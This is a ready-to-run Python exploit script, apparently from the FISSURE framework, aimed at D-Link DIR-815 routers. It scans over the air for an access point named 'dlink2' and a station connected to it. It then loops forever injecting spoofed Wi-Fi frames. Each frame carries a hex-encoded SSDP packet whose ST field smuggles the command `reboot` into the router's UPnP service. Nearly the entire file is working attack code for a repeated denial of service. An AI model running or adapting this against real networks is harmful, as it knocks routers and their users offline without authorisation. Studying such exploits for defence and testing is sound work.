#!/usr/bin/env python3

"""
DIR-815 Reboot Exploit via Packet Injection (SSID-based)

Scans for D-Link access point with SSID 'dlink2', identifies a connected station,
and launches a reboot attack using crafted UDP packets via monitor mode.

Hardware: 802.11x Adapter
Attack Type: Python3 Script
Filename: D-Link_DIR-815_SSID_Reboot.py
Category: Injection
Version: maint-3.10
"""

import sys
import time
import subprocess
from scapy.all import RadioTap, sendp, IP, UDP, LLC, SNAP

#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    iface = "wlx00c0caafc930"
    interval = "0.25"  # seconds between Scapy packet transmissions
    ssid = "dlink2"
    run_with_sudo = "False"
    notes = "This attack locates a D-Link AP and injects spoofed SSDP packets to trigger a router reboot via UPnP."

    arg_names = ['iface', 'interval', 'ssid', 'run_with_sudo', 'notes']
    arg_values = [iface, interval, ssid, run_with_sudo, notes]
    return (arg_names, arg_values)
#################################################

# === CONFIG from getArguments ===
ARGS = dict(zip(*getArguments()))
IFACE = ARGS['iface']
INTERVAL = float(ARGS['interval'])
TARGET_SSID = ARGS['ssid']
CHANNEL = "1"
DWELL = 2  # seconds
UDP_HEX = (
    "4d2d534541524348202a20485454502f312e310d0a484f53543a3233392e3235352e3235352e3235303a313930300d0a"
    "53543a757569643a607265626f6f74600d0a4d583a320d0a4d414e3a22737364703a646973636f766572220d0a0d0a"
)

def set_monitor_mode(dev):
    subprocess.run(['sudo', 'ifconfig', dev, 'down'])
    subprocess.run(['sudo', 'iwconfig', dev, 'mode', 'Monitor'])
    subprocess.run(['sudo', 'ifconfig', dev, 'up'])

def set_channel(dev, ch):
    subprocess.run(['sudo', 'iwconfig', dev, 'channel', str(ch)])

def decode_ssid(hex_ssid):
    try:
        return bytes.fromhex(hex_ssid).decode('utf-8', errors='ignore')
    except:
        return ""

def is_valid_mac(mac):
    return mac and len(mac) == 17 and mac.lower() != 'ff:ff:ff:ff:ff:ff'

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else IFACE
    set_monitor_mode(iface)
    set_channel(iface, CHANNEL)

    tshark_cmd = [
        'tshark', '-i', iface,
        '-E', 'separator=,', '-E', 'occurrence=f',
        '-Tfields', '-a', f'duration:{DWELL}',
        '-e', 'wlan.sa', '-e', 'wlan.ta',
        '-e', 'wlan.ra', '-e', 'wlan.da',
        '-e', 'radiotap.channel.freq',
        '-e', 'wlan.ssid', '-e', 'wlan.fc.type_subtype'
    ]

    ap_mac = None
    sta_mac = None

    print(f"[*] Scanning for SSID '{TARGET_SSID}' on channel {CHANNEL}...")

    while True:
        out = subprocess.run(tshark_cmd, capture_output=True)
        lines = out.stdout.decode().splitlines()

        for line in lines:
            fields = line.strip().split(',')
            if len(fields) != 7:
                continue

            sa, ta, ra, da, freq, ssid_hex, subtype = [f.strip() for f in fields]
            ssid = decode_ssid(ssid_hex)
            subtype = subtype.lower().replace('0x', '').lstrip('0')

            if not ap_mac and subtype == '8' and ssid == TARGET_SSID:
                for mac in [sa, ta, ra, da]:
                    if is_valid_mac(mac):
                        ap_mac = mac
                        print(f"[+] Found AP '{ssid}' at {ap_mac}")
                        break

            elif ap_mac and not sta_mac:
                if da == ap_mac or ra == ap_mac:
                    for mac in [sa, ta, ra, da]:
                        if is_valid_mac(mac) and mac != ap_mac:
                            sta_mac = mac
                            print(f"[+] Found station talking to {ap_mac}: {sta_mac}")
                            break

        if ap_mac and sta_mac:
            run_reboot_attack(iface, ap_mac, sta_mac)
            return

        time.sleep(DWELL)

def run_reboot_attack(iface, ap_mac, sta_mac):
    print("[*] Launching reboot loop...")
    sta_dest_mac = "ff:ff:ff:ff:ff:ff"
    fragment_sequence = "E0EB"
    llc = LLC() / SNAP()
    udp = IP(src="192.168.1.10", dst="239.255.255.250") / \
          UDP(sport=12345, dport=1900) / \
          bytes.fromhex(UDP_HEX)

    while True:
        fragment_sequence = "F0EB" if fragment_sequence == "E0EB" else "E0EB"
        msg_data = bytes.fromhex(
            "08" + "01" + "2C00" +
            ap_mac.replace(":", "") +
            sta_mac.replace(":", "") +
            sta_dest_mac.replace(":", "") +
            fragment_sequence
        )
        pkt = RadioTap() / msg_data / llc / udp

        try:
            sendp(pkt, iface=iface, verbose=0)
            print(f"[>] Sent reboot to {ap_mac} using station {sta_mac}")
        except OSError as e:
            print(f"[!] sendp failed: {e}")
            break

        time.sleep(INTERVAL)

if __name__ == '__main__':
    main()
